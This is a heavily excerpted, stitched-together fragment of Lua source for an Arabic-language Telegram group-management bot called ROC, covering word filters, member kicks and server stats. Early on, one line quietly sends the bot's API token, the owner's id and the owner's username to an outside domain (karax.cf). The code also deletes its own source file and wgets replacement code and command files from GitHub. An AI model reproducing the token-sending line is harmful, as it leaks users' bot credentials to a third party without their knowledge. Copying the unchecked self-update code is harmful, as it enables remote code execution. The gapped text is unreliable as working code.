...
https.request('http://karax.cf/ROC/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./ROC.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("BK", "w")  
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/ROCTEAM/Files_ROC/master/File_Bot/commands.lua") 
...
--------------------------------------------------------------------------------------------------------------
function SourceROC(msg,data) -- بداية العمل
if msg then
...
send(msg.chat_id_, msg.id_,ROC_Msg) 
return false  
end 
if text then    
...
if text == 'معلومات السيرفر 📊' and SudoBot(msg) then 
 local text2 = 'Info Server : \n'
  local ROC1 = database:info()
  text2 = text2..'1 - *Uptime Days* : `'..ROC1.server.uptime_in_days..'('..ROC1.server.uptime_in_seconds..' seconds)`\n'
  text2 = text2..'2 - *Commands Processed* : `'..ROC1.stats.total_commands_processed..'`\n'
  text2 = text2..'3 - *Expired Keys* : `'..ROC1.stats.expired_keys..'`\n'
  text2 = text2..'4 - *Ops/sec* : `'..ROC1.stats.instantaneous_ops_per_sec..'`\n'
send(msg.chat_id_, msg.id_, text2)  
end


if text == 'تحديث السورس ™' and SudoBot(msg) then 
os.execute('rm -rf ROC.lua')
os.execute('wget https://raw.githubusercontent.com/ROCTEAM/ROC/master/ROC.lua')
...
send(msg.chat_id_, msg.id_,'📌| عدد المجموعات الان » { '..#group..' }'..ROCk..''..ROC..'\n*📌| الان عدد المجموعات الحقيقي » { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
...
local ROC1_Msg = database:get(bot_id.."ROC1:Add:Filter:Rp2"..text..msg.chat_id_)   
if ROC1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤| العضو ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'BOBBW')..') \n 📬|'..ROC1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if ROC_Msg and not Special(msg) then  
local ROC_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if ROC_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
if SudoBot(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/BOYKAAX/Files_ROC/master/getfile.json")
if res == 200 then
...
local json_file, res = https.request("https://raw.githubusercontent.com/ROCTEAM/Files_ROC/master/File_Bot/"..file)
if res == 200 then
...
database:set(bot_id.."ROC1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."ROC1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"🚸|ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."ROC1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."ROC1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."ROC1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."ROC1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_,"🔖|تم منع الكلمه مع التحذير")  
database:del(bot_id.."ROC1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."ROC1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."ROC1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."ROC1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_,"🔖|ارسل الكلمه الان")  
database:set(bot_id.."ROC1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."ROC1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."ROC1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."ROC1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."ROC1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."ROC1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."ROC1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."ROC1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."ROC1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n⛔|قائمة المنع \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
for k,v in pairs(list) do  
local ROC_Msg = database:get(bot_id.."ROC1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..ROC_Msg.."}\n"    
end  
if #list == 0 then  
...
send(msg.chat_id_, msg.id_,'['..ROC_Msg[math.random(#ROC_Msg)]..']') 
return false
end
...
-- vardump(data) 
ROCdx(msg.chat_id_, msg.id_, '📤| ايدي المجموعة » ( '..msg.chat_id_..' )\n🚸| عدد الادمنيه » ( *'..data.administrator_count_..' )*\n📛| عدد المحظورين » ( *'..data.kicked_count_..' )*\n🏆| عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
ROC = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(ROC)
...
------------------------------------------------------------------------
local ROCAbot = database:get(bot_id.."ROC1:Add:Filter:Rp2"..text..result.chat_id_)   
if ROCAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠|العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫|["..ROCAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local ROC1_Msg = database:get(bot_id.."ROC1:Add:Filter:Rp2"..text..result.chat_id_)   
if ROC1_Msg then    
send(msg.chat_id_, msg.id_,"🔖|"..ROC1_Msg)
